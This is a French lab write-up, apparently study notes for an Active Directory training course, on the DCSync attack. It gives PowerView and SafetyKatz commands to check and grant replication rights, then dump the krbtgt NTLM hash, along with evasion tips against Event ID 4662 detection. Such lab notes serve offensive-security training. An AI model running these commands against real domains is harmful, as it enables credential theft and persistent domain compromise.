---
flag: 21
machine: dcorp-dc
statut: à faire
technique: DCSync
LO: "[[LO12 - DCSync rights]]"
---

# F21 · Attaque avec droits de réplication

> [!summary] Objectif
> Nommer l'attaque exécutable avec les droits de réplication sans privilèges DA — puis la dérouler pour extraire un hash arbitraire (typiquement `krbtgt`).

## Contexte
- **Étape attack flow**: post-DA (persistance) ou compte à qui on a déjà délégué les rights `DS-Replication-Get-Changes[-All]`.
- **Ce qu'on a**: un shell studentx avec droits DCSync posés (via `Add-DomainObjectAcl` depuis un contexte DA préalable).
- **Ce qu'on cherche**: le nom de l'attaque (réponse courte = **DCSync**) — puis le hash NTLM d'un compte cible (souvent `krbtgt`).

## Solution

### Étape 1 — Vérifier que studentx possède déjà les droits de réplication
```powershell
. C:\AD\Tools\PowerView.ps1
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs |
  ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} |
  ?{$_.IdentityName -match "studentx"}
```
→ Voir [[Cheatsheet - ACL et droits AD]] et [[Cheatsheet - Persistence]].

### Étape 2 — Poser les droits DCSync (si absents, depuis un contexte DA)
```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync
```

### Étape 3 — Exécuter DCSync
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
→ Voir [[Cheatsheet - Persistence]] section DCSync.

## Réponse

| Élément | Valeur |
|---------|--------|
| Nom de l'attaque | DCSync |
| Hash NTLM krbtgt (dérivé) | <A REMPLIR DEPUIS LAB> |

## Pièges et OPSEC
- Sans le droit `DS-Replication-Get-Changes-All`, DCSync sur `krbtgt` échoue silencieusement — les deux droits (`Get-Changes` + `Get-Changes-All`) sont nécessaires.
- Trace côté DC : **Event ID 4662** avec les GUIDs `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes) et `1131f6ad-...` (Get-Changes-All).
- `evasive-dcsync` (SafetyKatz) réduit le pattern « replication from non-DC » — vanilla `mimikatz lsadump::dcsync` est bruyant.
- Ne pas exécuter depuis le DC lui-même (perd l'intérêt vs dump local).

## Refs
- [[Cheatsheet - Persistence]]
- [[Cheatsheet - ACL et droits AD]]
- [[LO12 - DCSync rights]]
- [[Synthèse - ACL et GPO]]

[[Flags - Index]] · [[Journal - Index]]
